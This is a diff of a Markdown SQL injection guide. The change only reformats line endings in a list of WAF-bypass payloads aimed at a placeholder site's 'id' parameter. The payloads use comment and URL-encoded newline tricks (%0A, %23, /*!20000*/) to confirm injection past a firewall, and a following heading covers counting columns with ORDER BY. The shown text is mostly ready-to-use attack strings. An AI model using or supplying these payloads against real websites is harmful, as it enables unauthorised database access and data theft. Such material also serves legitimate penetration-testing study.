@@ -42,14 +42,14 @@ If no WAF Warning is shown and website loads up, we confirm the vulnerability, e
 ```http//domain.com/index.php?id=1'--/*1337*/-```  
 ```http//domain.com/index.php?id=1'--/**_**/-```  
 ```http//domain.com/index.php?id=1'--%0A-```  
-```http//domain.com/index.php?id=1'--%0b-```
-```http//domain.com/index.php?id=1'--%0d%0A-```
-```http//domain.com/index.php?id=1'--%23%0A-```
-```http//domain.com/index.php?id=1'--%23foo%0D%0A-```
+```http//domain.com/index.php?id=1'--%0b-```  
+```http//domain.com/index.php?id=1'--%0d%0A-```  
+```http//domain.com/index.php?id=1'--%23%0A-```  
+```http//domain.com/index.php?id=1'--%23foo%0D%0A-```  
 ```http//domain.com/index.php?id=1'--%23foo*%2F*bar%0D%0A-```  
 ```http//domain.com/index.php?id=1'--#qa%0A#%0A-```  
 ```http//domain.com/index.php?id=/*!20000%0d%0a1'--+-*/```  
-```http//domain.com/index.php?id=/*!blobblobblob%0d%0a1'--+-*/```
+```http//domain.com/index.php?id=/*!blobblobblob%0d%0a1'--+-*/```  
 
 ## Find the number of columns using 'ORDER BY' query  
 
